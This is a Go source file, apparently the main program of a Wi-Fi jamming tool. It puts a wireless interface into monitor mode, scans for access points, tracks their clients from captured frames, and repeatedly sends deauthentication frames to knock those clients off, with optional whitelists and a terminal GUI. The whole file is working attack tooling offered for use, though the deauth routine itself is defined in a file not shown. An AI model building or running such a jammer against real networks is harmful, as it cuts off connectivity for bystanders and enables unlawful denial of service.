package main

import (
	"github.com/jroimartin/gocui"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/jessevdk/go-flags"
)

type Opts struct {
	MonitorInterface string `short:"i" long:"interface" required:"true" description:"name of interface that will be used for monitoring and injecting frames (e.g wlan0)"`
	ClientWhiteList  string `short:"c" long:"cwlist" description:"file with new line separated list of MACs to be spared"`
	APWhiteList      string `short:"a" long:"awlist" description:"file with new line separated list of SSIDs to be spared"`
	GuiMode          bool   `short:"g" long:"gui" description:"enable gui mode for manual control"`
}

var (
	OptsG Opts
	MonIfaGuiG *JamConn
	WListAPGuiG *List
	WListCliGuiG *List
	TargAPGuiG *List
	TargCliGuiG *List
	GuiG *gocui.Gui
	QuitG = false
)

func	handleSigInt() {

	sigc := make(chan os.Signal, 1)
	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitG = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func	checkComms(targAPs *List, targCli *List, wListCli *List, pkt gopacket.Packet) {

	var cli		*Client
	var ap AP
	var cliAddr	net.HardwareAddr
	var apAddr	net.HardwareAddr
	var fromClient = false

	if pkt == nil {
		return
	}
	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
	dot11 := pkt.Layer(layers.LayerTypeDot11)
	if dot11 == nil || radioTap == nil {
		return
	}
	tap := radioTap.(*layers.RadioTap)
	dot := dot11.(*layers.Dot11)
	// did the message originate from the client?
	if dot.Address1.String() != dot.Address3.String() {
		cliAddr = dot.Address1
		apAddr = dot.Address2
		fromClient = true
	} else {
		apAddr = dot.Address1
		cliAddr = dot.Address2
	}
	// is the client whitelisted?
	if _, ok := wListCli.Get(cliAddr.String()); ok {
		return
	}
	// is the ap on our target list?
	if a, ok := targAPs.Get(apAddr.String()[:16]); ok {
		ap = (a).(AP)
	} else {
		return
	}
	// have we seen this client before?
	if v, ok := targCli.Get(cliAddr.String()); ok {
		cli = (v).(*Client)
	} else {
		cli = new(Client)
		cli.hwaddr = cliAddr
	}
	if fromClient {
		cli.dot = *dot
		cli.tap = *tap
	} else {
		ap.dot = *dot
		ap.tap = *tap
	}
	targCli.Add(cli.hwaddr.String(), cli)
	ap.AddClient(cli)
	targAPs.Add(ap.hwaddr.String()[0:16], ap)
}

func	getWhiteLists(opts *Opts) (client List, ap List) {

	apWList, err := getListFromFile(opts.APWhiteList)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	cliWList, err := getListFromFile(opts.ClientWhiteList)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	return cliWList, apWList
}

func	initEnv() {
	//set rand seed
	rand.Seed(time.Now().UTC().UnixNano())
	//catch sigint
	handleSigInt()
}


func	guiMode(monIfa *JamConn, targAP *List, clients *List, wListAP *List, wListCli *List) {

	MonIfaGuiG = monIfa
	WListAPGuiG = wListAP
	WListCliGuiG = wListCli
	TargAPGuiG = targAP
	TargCliGuiG = clients

	gui, err := initGui()
	if err != nil {
		log.Panicln(err)
	}
	defer gui.Close()
	GuiG = gui
	go goJamLoop(MonIfaGuiG, TargAPGuiG, TargCliGuiG, WListAPGuiG, WListCliGuiG)
	go doEvery(time.Millisecond * 400, updateViews)
	gui.SetManagerFunc(goJamGui)
	if err := keybindings(gui); err != nil {
		log.Panicln(err)
	}
	if err := gui.MainLoop(); err != nil && err != gocui.ErrQuit {
		log.Panicln(err)
	}
}

func	goJamLoop(monIfa *JamConn, targAPs *List, targClis *List, wListAPs *List, wListCli *List) {

	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
	for !QuitG {
		packet, err := packSrc.NextPacket()
		if err != nil {
			if err.Error() == "Read Error" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err,
					"\ndevice possibly disconnected or removed from monitor mode")
			}
			if err.Error() != "Timeout Expired" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
			}
		}
		checkComms(targAPs, targClis, wListCli, packet)
		monIfa.DeauthClientsIfPast(time.Second * 5,2, targAPs)
		monIfa.DoAPScanIfPast(time.Minute * 1, wListAPs, targAPs)
	}
}

func	main() {

	var targAPs		List
	var targClis	List

	initEnv()
	if _, err := flags.ParseArgs(&OptsG, os.Args); err != nil {
		os.Exit(1)
	}
	wListCli, wListAPs := getWhiteLists(&OptsG)
	monIfa, err := NewJamConn(OptsG.MonitorInterface)
	if err != nil {
		log.Fatalln("NewJamConn()", err)
	}
	defer func() {
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close()", err)
		}
	}()
	if err := monIfa.DoAPScan(&wListAPs, &targAPs); err != nil {
		log.Fatalln("JamConn.DoAPScan()", err)
	}
	if err := monIfa.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
		log.Fatalln("JamConn.SetIfaType()", err.Error())
	}
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err := monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err := monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}
	monIfa.SetLastChanSwitch(time.Now())
	monIfa.SetLastDeauth(time.Now())
	if OptsG.GuiMode {
		guiMode(monIfa, &targAPs, &targClis, &wListAPs, &wListCli)
	} else {
		goJamLoop(monIfa, &targAPs, &targClis, &wListAPs, &wListCli)
	}
}
